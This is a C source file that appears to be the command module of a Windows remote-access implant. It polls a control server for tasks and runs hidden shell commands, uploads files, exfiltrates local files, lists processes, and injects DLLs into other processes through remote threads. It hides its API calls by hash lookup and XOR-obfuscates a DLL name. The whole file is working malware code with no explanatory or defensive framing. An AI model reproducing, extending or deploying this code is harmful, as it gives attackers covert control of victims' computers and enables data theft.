#include "Command.h"
#include "Package.h"
#include "Resolve.h"
#include "Hashes.h"
#include <stdio.h>
#include <tlhelp32.h>

extern UINT32   g_AgentID;
extern DWORD    g_SleepTime;
extern BOOL     g_Connected;

#define COMMAND_COUNT 6

VOID TaskParserNew(PTASK_PARSER Parser, PVOID Buffer, UINT32 Size, UINT32 Endian){
    Parser->Buffer = (PUCHAR)Buffer;
    Parser->Length = Size;
    Parser->Endian = Endian;
}

UINT32 TaskParserGetInt32(PTASK_PARSER Parser){
    if (Parser->Length < 4)
        return 0;

    PUCHAR B = Parser->Buffer;
    UINT32 val;

    if (Parser->Endian == ENDIAN_BIG)
        val = (B[0] << 24) | (B[1] << 16) | (B[2] << 8) | B[3];
    else
        val = (B[3] << 24) | (B[2] << 16) | (B[1] << 8) | B[0];

    Parser->Buffer += 4;
    Parser->Length -= 4;
    return val;
}

PCHAR TaskParserGetBytes(PTASK_PARSER Parser, PUINT32 OutSize){
    UINT32 sz = TaskParserGetInt32(Parser);

    if (sz == 0 || sz > Parser->Length){
        if (OutSize) *OutSize = 0;
        return NULL;
    }

    PCHAR ptr = (PCHAR)Parser->Buffer;
    Parser->Buffer += sz;
    Parser->Length -= sz;

    if (OutSize) *OutSize = sz;
    return ptr;
}

UINT32 DetectEndianness(PVOID Buffer, UINT32 Size){
    if (Size < 4)
        return ENDIAN_LITTLE;

    PUCHAR B = (PUCHAR)Buffer;
    UINT32 be = (B[0] << 24) | (B[1] << 16) | (B[2] << 8) | B[3];
    UINT32 le = (B[3] << 24) | (B[2] << 16) | (B[1] << 8) | B[0];

    if (be == COMMAND_NO_JOB || be == COMMAND_GET_JOB || be == COMMAND_OUTPUT)
        return ENDIAN_BIG;
    if (le == COMMAND_NO_JOB || le == COMMAND_GET_JOB || le == COMMAND_OUTPUT)
        return ENDIAN_LITTLE;

    return ENDIAN_LITTLE; // handler packer default
}


VOID CommandShell(PTASK_PARSER Parser){
    typedef BOOL (WINAPI* fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
    typedef BOOL (WINAPI* fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    typedef BOOL (WINAPI* fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL (WINAPI* fn_Close)(HANDLE);
    typedef DWORD (WINAPI* fn_Wait)(HANDLE, DWORD);
    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
    typedef HLOCAL (WINAPI* fn_ReAlloc)(HLOCAL, SIZE_T, UINT);
    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;

    fn_CreatePipe     pPipe    = (fn_CreatePipe)ResolveFuncH(k32, H_CreatePipe);
    fn_CreateProcessA pExec    = (fn_CreateProcessA)ResolveFuncH(k32, H_CreateProcessA);
    fn_ReadFile       pRead    = (fn_ReadFile)ResolveFuncH(k32, H_ReadFile);
    fn_Close          pClose   = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
    fn_Wait           pWait    = (fn_Wait)ResolveFuncH(k32, H_WaitForSingleObject);
    fn_Alloc          pAlloc   = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
    fn_ReAlloc        pReAlloc = (fn_ReAlloc)ResolveFuncH(k32, H_LocalReAlloc);
    fn_Free           pFree    = (fn_Free)ResolveFuncH(k32, H_LocalFree);

    if (!pPipe || !pExec || !pRead || !pClose || !pWait || !pAlloc)
        return;

    UINT32  dwLen           = 0;
    PCHAR   Cmd             = NULL;
    HANDLE  hStdOutRd       = NULL;
    HANDLE  hStdOutWr       = NULL;
    HANDLE  hStdInRd        = NULL;
    HANDLE  hStdInWr        = NULL;
    CHAR    buf[4096]       = { 0 };

    PROCESS_INFORMATION pi  = { 0 };
    SECURITY_ATTRIBUTES sa  = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    STARTUPINFOA        si  = { 0 };

    Cmd = TaskParserGetBytes(Parser, &dwLen);
    if (!Cmd || dwLen == 0) return;

    int off = wsprintfA(buf, "cmd.exe /c ");
    if (dwLen >= sizeof(buf) - off) dwLen = sizeof(buf) - off - 1;
    memcpy(buf + off, Cmd, dwLen);

    if (!pPipe(&hStdInRd, &hStdInWr, &sa, 0))
        return;

    if (!pPipe(&hStdOutRd, &hStdOutWr, &sa, 0)){
        pClose(hStdInRd);
        pClose(hStdInWr);
        return;
    }

    si.cb         = sizeof(STARTUPINFOA);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdError  = hStdOutWr;
    si.hStdOutput = hStdOutWr;
    si.hStdInput  = hStdInRd;

    if (!pExec(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)){
        pClose(hStdInRd);  pClose(hStdInWr);
        pClose(hStdOutRd); pClose(hStdOutWr);
        return;
    }

    pClose(hStdOutWr);
    pClose(hStdInRd);

    PVOID  pOut     = pAlloc(LPTR, 1);
    DWORD  dwOut    = 0;
    UCHAR  tmp[1024];
    DWORD  dwRead   = 0;

    while (pRead(hStdOutRd, tmp, sizeof(tmp) - 1, &dwRead, NULL) && dwRead > 0){
        pOut = pReAlloc(pOut, dwOut + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
        memcpy((PUCHAR)pOut + dwOut, tmp, dwRead);
        dwOut += dwRead;
    }

    pWait(pi.hProcess, INFINITE);

    PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
    PackageAddBytes(Pkg, (PUCHAR)pOut, dwOut);
    PackageTransmit(Pkg, NULL, NULL);

    pFree(pOut);
    pClose(hStdOutRd);
    pClose(hStdInWr);
    pClose(pi.hProcess);
    pClose(pi.hThread);
}


VOID CommandUpload(PTASK_PARSER Parser){
    typedef HANDLE (WINAPI* fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI* fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL (WINAPI* fn_Close)(HANDLE);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;

    fn_CreateFileA pCreateFile = (fn_CreateFileA)ResolveFuncH(k32, H_CreateFileA);
    fn_WriteFile   pWrite      = (fn_WriteFile)ResolveFuncH(k32, H_WriteFile);
    fn_Close       pClose      = (fn_Close)ResolveFuncH(k32, H_CloseHandle);

    if (!pCreateFile || !pWrite || !pClose) return;

    UINT32  nameLen  = 0;
    UINT32  fileSize = 0;
    PCHAR   fileName = TaskParserGetBytes(Parser, &nameLen);
    PVOID   content  = TaskParserGetBytes(Parser, &fileSize);
    DWORD   written  = 0;

    if (!fileName || !content) return;

    CHAR nameBuf[MAX_PATH] = { 0 };
    if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
    memcpy(nameBuf, fileName, nameLen);

    HANDLE hFile = pCreateFile(nameBuf, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    pWrite(hFile, content, fileSize, &written, NULL);
    pClose(hFile);

    PPACKAGE Pkg = PackageCreate(COMMAND_OUTPUT);
    char msg[512];
    int msgLen = wsprintfA(msg, "uploaded %s (%lu bytes)", nameBuf, written);
    PackageAddBytes(Pkg, (PUCHAR)msg, msgLen);
    PackageTransmit(Pkg, NULL, NULL);
}

VOID CommandDownload(PTASK_PARSER Parser){
    typedef HANDLE (WINAPI* fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI* fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef DWORD (WINAPI* fn_GetFileSize)(HANDLE, LPDWORD);
    typedef BOOL (WINAPI* fn_Close)(HANDLE);
    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;

    fn_CreateFileA pOpen  = (fn_CreateFileA)ResolveFuncH(k32, H_CreateFileA);
    fn_ReadFile    pRead  = (fn_ReadFile)ResolveFuncH(k32, H_ReadFile);
    fn_GetFileSize pSize  = (fn_GetFileSize)ResolveFuncH(k32, H_GetFileSize);
    fn_Close       pClose = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
    fn_Alloc       pAlloc = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
    fn_Free        pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);

    if (!pOpen || !pRead || !pSize || !pClose || !pAlloc) return;

    UINT32 nameLen  = 0;
    PCHAR  fileName = TaskParserGetBytes(Parser, &nameLen);

    if (!fileName) return;

    CHAR nameBuf[MAX_PATH] = { 0 };
    if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
    memcpy(nameBuf, fileName, nameLen);

    HANDLE hFile = pOpen(nameBuf, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;

    DWORD fSize  = pSize(hFile, NULL);
    PVOID fileBuf = pAlloc(LPTR, fSize);
    DWORD dwRead  = 0;

    if (!pRead(hFile, fileBuf, fSize, &dwRead, NULL)){
        pClose(hFile);
        pFree(fileBuf);
        return;
    }
    pClose(hFile);

    PPACKAGE Pkg = PackageCreate(COMMAND_DOWNLOAD);
    PackageAddBytes(Pkg, (PUCHAR)nameBuf, strlen(nameBuf));
    PackageAddBytes(Pkg, fileBuf, dwRead);
    PackageTransmit(Pkg, NULL, NULL);

    pFree(fileBuf);
}

VOID CommandProcList(PTASK_PARSER Parser){

    typedef HANDLE (WINAPI* fn_Snapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI* fn_ProcFirst)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI* fn_ProcNext)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI* fn_Close)(HANDLE);
    typedef HLOCAL (WINAPI* fn_Alloc)(UINT, SIZE_T);
    typedef HLOCAL (WINAPI* fn_ReAlloc)(HLOCAL, SIZE_T, UINT);
    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;

    fn_Snapshot  pSnapshot   = (fn_Snapshot)ResolveFuncH(k32, H_CreateToolhelp32Snapshot);
    fn_ProcFirst pProcFirst  = (fn_ProcFirst)ResolveFuncH(k32, H_Process32First);
    fn_ProcNext  pProcNext   = (fn_ProcNext)ResolveFuncH(k32, H_Process32Next);
    fn_Close     pCloseH     = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
    fn_Alloc     pAlloc      = (fn_Alloc)ResolveFuncH(k32, H_LocalAlloc);
    fn_ReAlloc   pReAlloc    = (fn_ReAlloc)ResolveFuncH(k32, H_LocalReAlloc);
    fn_Free      pFreeM      = (fn_Free)ResolveFuncH(k32, H_LocalFree);

    if (!pSnapshot || !pProcFirst || !pProcNext || !pCloseH || !pAlloc)
        return;

    HANDLE hSnap = pSnapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    DWORD cap = 0x10000;
    PCHAR out = (PCHAR)pAlloc(LPTR, cap);
    if (!out) { pCloseH(hSnap); return; }

    int pos = wsprintfA(out, "PID    PPID   Name\n---    ----   ----\n");

    if (pProcFirst(hSnap, &pe)) {
        do {
            CHAR line[300];
            int n = wsprintfA(line, "%-6lu %-6lu %s\n", pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);

            if ((DWORD)(pos + n) >= cap) {
                cap *= 2;
                out = (PCHAR)pReAlloc(out, cap, LMEM_MOVEABLE);
                if (!out) break;
            }
            memcpy(out + pos, line, n);
            pos += n;
        } while (pProcNext(hSnap, &pe));
    }

    pCloseH(hSnap);

    if (out) {
        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
        PackageAddBytes(pkg, (PUCHAR)out, pos);
        PackageTransmit(pkg, NULL, NULL);
        pFreeM(out);
    }
}

VOID CommandExit(PTASK_PARSER Parser){
    typedef VOID (WINAPI* fn_ExitProcess)(UINT);
    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;
    fn_ExitProcess pExit = (fn_ExitProcess)ResolveFuncH(k32, H_ExitProcess);
    if (pExit) pExit(0);
}


VOID CommandInjectDLL(PTASK_PARSER Parser){
    typedef HANDLE (WINAPI* fn_OpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID (WINAPI* fn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL   (WINAPI* fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    typedef HANDLE (WINAPI* fn_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef BOOL   (WINAPI* fn_Close)(HANDLE);
    typedef DWORD  (WINAPI* fn_Wait)(HANDLE, DWORD);
    typedef FARPROC (WINAPI* fn_GetProcAddress)(HMODULE, LPCSTR);
    typedef HMODULE (WINAPI* fn_GetModuleHandleA)(LPCSTR);

    typedef HANDLE (WINAPI* fn_Snapshot)(DWORD, DWORD);
    typedef BOOL   (WINAPI* fn_ProcFirst)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL   (WINAPI* fn_ProcNext)(HANDLE, LPPROCESSENTRY32);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;

    fn_OpenProcess        pOpen      = (fn_OpenProcess)ResolveFuncH(k32, H_OpenProcess);
    fn_VirtualAllocEx     pVAlloc    = (fn_VirtualAllocEx)ResolveFuncH(k32, H_VirtualAllocEx);
    fn_WriteProcessMemory pWriteMem  = (fn_WriteProcessMemory)ResolveFuncH(k32, H_WriteProcessMemory);
    fn_CreateRemoteThread pRemote    = (fn_CreateRemoteThread)ResolveFuncH(k32, H_CreateRemoteThread);
    fn_Close              pClose     = (fn_Close)ResolveFuncH(k32, H_CloseHandle);
    fn_Wait               pWait      = (fn_Wait)ResolveFuncH(k32, H_WaitForSingleObject);
    fn_GetProcAddress     pGPA       = (fn_GetProcAddress)ResolveFuncH(k32, H_GetProcAddress);
    fn_GetModuleHandleA   pGMH       = (fn_GetModuleHandleA)ResolveFuncH(k32, H_GetModuleHandleA);

    fn_Snapshot           pSnap      = (fn_Snapshot)ResolveFuncH(k32, H_CreateToolhelp32Snapshot);
    fn_ProcFirst          pFirst     = (fn_ProcFirst)ResolveFuncH(k32, H_Process32First);
    fn_ProcNext           pNext      = (fn_ProcNext)ResolveFuncH(k32, H_Process32Next);

    if (!pOpen || !pVAlloc || !pWriteMem || !pRemote || !pClose || !pWait || !pGPA || !pGMH)
        return;

    UINT32 nameLen = 0;
    UINT32 dllLen  = 0;
    PCHAR  procName = TaskParserGetBytes(Parser, &nameLen);
    PCHAR  dllPath  = TaskParserGetBytes(Parser, &dllLen);

    if (!dllPath || dllLen == 0) return;

    CHAR dllBuf[MAX_PATH] = { 0 };
    if (dllLen >= sizeof(dllBuf)) dllLen = sizeof(dllBuf) - 1;
    memcpy(dllBuf, dllPath, dllLen);

    DWORD dwPid = 0;

    if (procName && nameLen > 0) {
        CHAR nameBuf[MAX_PATH] = { 0 };
        if (nameLen >= sizeof(nameBuf)) nameLen = sizeof(nameBuf) - 1;
        memcpy(nameBuf, procName, nameLen);

        if (pSnap && pFirst && pNext) {
            HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe;
                pe.dwSize = sizeof(pe);

                if (pFirst(hSnap, &pe)) {
                    do {
                        BOOL match = TRUE;
                        for (int k = 0; nameBuf[k]; k++) {
                            CHAR a = nameBuf[k];
                            CHAR b = pe.szExeFile[k];
                            if (a >= 'A' && a <= 'Z') a += 32;
                            if (b >= 'A' && b <= 'Z') b += 32;
                            if (a != b) { match = FALSE; break; }
                        }
                        if (match) {
                            dwPid = pe.th32ProcessID;
                            break;
                        }
                    } while (pNext(hSnap, &pe));
                }
                pClose(hSnap);
            }
        }
    }

    if (dwPid == 0) {
        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
        char err[] = "inject: target not found";
        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
        PackageTransmit(pkg, NULL, NULL);
        return;
    }

    HANDLE hProc = pOpen(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwPid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
        char err[] = "inject: openprocess failed";
        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
        PackageTransmit(pkg, NULL, NULL);
        return;
    }

    SIZE_T pathSize = strlen(dllBuf) + 1;
    LPVOID pRemoteBuf = pVAlloc(hProc, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        pClose(hProc);
        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
        char err[] = "inject: virtualallocex failed";
        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
        PackageTransmit(pkg, NULL, NULL);
        return;
    }

    if (!pWriteMem(hProc, pRemoteBuf, dllBuf, pathSize, NULL)) {
        pClose(hProc);
        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
        char err[] = "inject: writeprocessmemory failed";
        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
        PackageTransmit(pkg, NULL, NULL);
        return;
    }

    UCHAR sK32[] = { 0xE4,0xEA,0xFD,0xE1,0xEA,0xE3,0xBC,0xBD,0xA1,0xEB,0xE3,0xE3,0x00 };
    for (int i = 0; i < 12; i++) sK32[i] ^= 0x8F;

    HMODULE hK32Remote = pGMH((LPCSTR)sK32);
    FARPROC pLoadLib = pGPA(hK32Remote, "loadlibraryA");

    HANDLE hThread = pRemote(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteBuf, 0, NULL);
    if (!hThread) {
        pClose(hProc);
        PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
        char err[] = "inject: createremotethread failed";
        PackageAddBytes(pkg, (PUCHAR)err, sizeof(err) - 1);
        PackageTransmit(pkg, NULL, NULL);
        return;
    }

    pWait(hThread, 5000);
    pClose(hThread);
    pClose(hProc);

    PPACKAGE pkg = PackageCreate(COMMAND_OUTPUT);
    char msg[512];
    int n = wsprintfA(msg, "injected %s into pid %lu", dllBuf, dwPid);
    PackageAddBytes(pkg, (PUCHAR)msg, n);
    PackageTransmit(pkg, NULL, NULL);
}

static COMMAND_ENTRY CommandTable[COMMAND_COUNT] = {
    { .ID = COMMAND_SHELL,    .Function = CommandShell },
    { .ID = COMMAND_UPLOAD,   .Function = CommandUpload },
    { .ID = COMMAND_DOWNLOAD, .Function = CommandDownload },
    { .ID = COMMAND_EXIT,     .Function = CommandExit },
    { .ID = COMMAND_PROCLIST,   .Function = CommandProcList },
    { .ID = COMMAND_INJECT_DLL, .Function = CommandInjectDLL },
};

VOID CommandDispatcher(VOID){
    typedef VOID (WINAPI* fn_Sleep)(DWORD);
    typedef HLOCAL (WINAPI* fn_Free)(HLOCAL);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    if (!k32) return;

    fn_Sleep pSleep = (fn_Sleep)ResolveFuncH(k32, H_Sleep);
    fn_Free  pFree  = (fn_Free)ResolveFuncH(k32, H_LocalFree);
    if (!pSleep || !pFree) return;

    PPACKAGE    Package    = NULL;
    PVOID       Data       = NULL;
    SIZE_T      Size       = 0;

    do {
        if (!g_Connected)
            return;

        pSleep(g_SleepTime * 1000);

        Package = PackageCreate(COMMAND_GET_JOB);
        PackageAddInt32(Package, g_AgentID);

        if (!PackageTransmit(Package, &Data, &Size)){ break; }

        if (!Data || Size < 4)
            break;

        UINT32 endian = DetectEndianness(Data, Size);
        TASK_PARSER Parser = { 0 };
        TaskParserNew(&Parser, Data, Size, endian);

        UINT32 first = TaskParserGetInt32(&Parser);
        if (first == COMMAND_NO_JOB)
            goto next;

        while (Parser.Length >= 4){
            UINT32 cmd = TaskParserGetInt32(&Parser);

            if (cmd == COMMAND_NO_JOB)
                break;

            BOOL found = FALSE;
            for (UINT32 i = 0; i < COMMAND_COUNT; i++){
                if (CommandTable[i].ID == cmd){
                    CommandTable[i].Function(&Parser);
                    found = TRUE;
                    break;
                }
            }

            if (!found)
                printf("[dispatch] unknown cmd: 0x%x\n", cmd);
        }

next:
        if (Data){
            memset(Data, 0, Size);
            pFree(Data);
            Data = NULL;
        }

    } while (TRUE);

    g_Connected = FALSE;
}
